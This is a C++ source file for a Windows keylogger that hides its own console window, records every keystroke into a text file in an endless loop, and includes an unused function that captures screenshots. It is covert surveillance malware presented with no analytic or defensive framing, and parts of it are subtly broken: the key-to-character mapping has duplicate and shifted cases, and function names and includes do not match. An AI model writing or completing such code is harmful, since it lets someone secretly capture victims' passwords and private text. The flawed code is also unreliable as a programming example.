#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <iostream>

using namespace std;

void StartLogging();
void StealthMode();
void TakeScreenshot(const string path);

void TakeScreenShot(const std::string& path)
{
	//setting to the screen shot
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

	//handler of the bitmap that save the screen shot
	HBITMAP hBitmap;

	//I have to give for it time to make it work
	Sleep(100);

	//take the screen shot
	OpenClipboard(NULL);

	//save the screen shot in the bitmap handler 
	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);

	//relese the screen shot
	CloseClipboard();

	vector<BYTE> buf;
	IStream *stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;

	// screenshot to jpg and save to stream
	image.Attach(hBitmap);
	image.Save(stream, Gdiplus::ImageFormatJPEG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();

	// put the imaage in the file
	fstream fi;
	fi.open(path, fstream::binary | fstream::out);
	fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
	fi.close();
	return;
}

void StealthMode()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	return;
}

int main(int argc, char *argv [])
{
	StealthMode();
	StartLogging();
	return 0;
}

void StartLogging()
{
	char c;
	for(;;)
	{
		for(c=8; c<=222; c++)
		{
			if(GetAsyncKeyState(c) == -32767)
			{
				ofstream write("logger.txt", ios::app);
				if(((c>64) && (c<91) && !(GetAsyncKeyState(0x10))))
				{
					c+=32;
					write<<c;
					write.close();
					break;
				}
				else if((c>64) && (c<91))
				{
					write<<c;
					write.close();
					break;
				}
				else
				{
					switch(c)
					{
						case 48:
						{
							if(GetAsyncKeyState(0x10))
								write<<")";
							else
								write<<"0";
						}
						break;
						case 49:
						{
							if(GetAsyncKeyState(0x10))
								write<<"!";
							else
								write<<"1";
						}
						break;
						case 50:
						{
							if(GetAsyncKeyState(0x10))
								write<<"@";
							else
								write<<"2";
						}
						break;
						case 51:
						{
							if(GetAsyncKeyState(0x10))
								write<<"#";
							else
								write<<"3";
						}
						break;
						case 51:
						{
							if(GetAsyncKeyState(0x10))
								write<<"$";
							else
								write<<"4";
						}
						break;
						case 52:
						{
							if(GetAsyncKeyState(0x10))
								write<<"%";
							else
								write<<"5";
						}
						break;
						case 53:
						{
							if(GetAsyncKeyState(0x10))
								write<<"^";
							else
								write<<"6";
						}
						break;
						case 54:
						{
							if(GetAsyncKeyState(0x10))
								write<<"&";
							else
								write<<"7";
						}
						break;
						case 55:
						{
							if(GetAsyncKeyState(0x10))
								write<<"*";
							else
								write<<"8";
						}
						break;
						case 56:
						{
							if(GetAsyncKeyState(0x10))
								write<<"(";
							else
								write<<"9";
						}
						break;
						case VK_TAB:
							write<<"	";
							break;
						case VK_BACK:
							write<<"\b";
							break;
						case VK_RETURN:
							write<<"\n";
							break;
						case VK_SPACE:
							write<<" ";
							break;
						default:
							write<<c;
					}
				}
			}
		}
	}
	return;
}